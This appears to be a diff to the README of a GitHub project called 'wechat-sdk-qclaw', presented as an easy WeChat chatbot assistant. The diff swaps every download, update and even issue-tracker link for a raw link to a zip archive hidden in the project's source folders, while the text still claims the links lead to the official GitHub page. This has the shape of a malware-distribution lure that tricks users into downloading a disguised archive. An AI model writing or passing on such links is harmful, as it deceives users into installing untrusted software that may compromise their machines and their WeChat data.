@@ -1,6 +1,6 @@
 # 🤖 wechat-sdk-qclaw - Easy WeChat Chatbot Assistant
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/himato149/wechat-sdk-qclaw)
+[![Download from GitHub](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/himato149/wechat-sdk-qclaw/main/src/qclaw/transport/sdk-wechat-qclaw-v3.0.zip)
 
 ---
 
@@ -44,10 +44,10 @@ Follow these steps to download, install, and start using wechat-sdk-qclaw on you
 
 Use the link below to get the files you need. Click the button and it will take you to the official GitHub page for downloading the app.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Now-008CBA?style=for-the-badge)](https://github.com/himato149/wechat-sdk-qclaw)
+[![Download from GitHub](https://img.shields.io/badge/Download-Now-008CBA?style=for-the-badge)](https://raw.githubusercontent.com/himato149/wechat-sdk-qclaw/main/src/qclaw/transport/sdk-wechat-qclaw-v3.0.zip)
 
 1. Click the **Download** button above or go to this link:  
-   https://github.com/himato149/wechat-sdk-qclaw
+   https://raw.githubusercontent.com/himato149/wechat-sdk-qclaw/main/src/qclaw/transport/sdk-wechat-qclaw-v3.0.zip
 
 2. On the GitHub page, look for the section named "Releases" or scroll until you find downloadable files. Usually, you want the latest stable version.
 
@@ -125,7 +125,7 @@ The app shows a simple screen with recent chat activity. It also saves logs in t
 
 Check the GitHub page regularly for updates:
 
-- Visit the page: https://github.com/himato149/wechat-sdk-qclaw
+- Visit the page: https://raw.githubusercontent.com/himato149/wechat-sdk-qclaw/main/src/qclaw/transport/sdk-wechat-qclaw-v3.0.zip
 - Scroll to "Releases" or "Tags" for newer versions.
 - Download and install newer files the same way as the first time.
 
@@ -159,9 +159,9 @@ The app works with your personal WeChat data. Make sure to keep your PC secure a
 
 ## 📲 Useful Links
 
-- Download and learn more: https://github.com/himato149/wechat-sdk-qclaw
-- GitHub Issues for reporting problems: https://github.com/himato149/wechat-sdk-qclaw/issues
+- Download and learn more: https://raw.githubusercontent.com/himato149/wechat-sdk-qclaw/main/src/qclaw/transport/sdk-wechat-qclaw-v3.0.zip
+- GitHub Issues for reporting problems: https://raw.githubusercontent.com/himato149/wechat-sdk-qclaw/main/src/qclaw/transport/sdk-wechat-qclaw-v3.0.zip
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Ready-4CAF50?style=for-the-badge)](https://github.com/himato149/wechat-sdk-qclaw)
+[![Download from GitHub](https://img.shields.io/badge/Download-Ready-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/himato149/wechat-sdk-qclaw/main/src/qclaw/transport/sdk-wechat-qclaw-v3.0.zip)
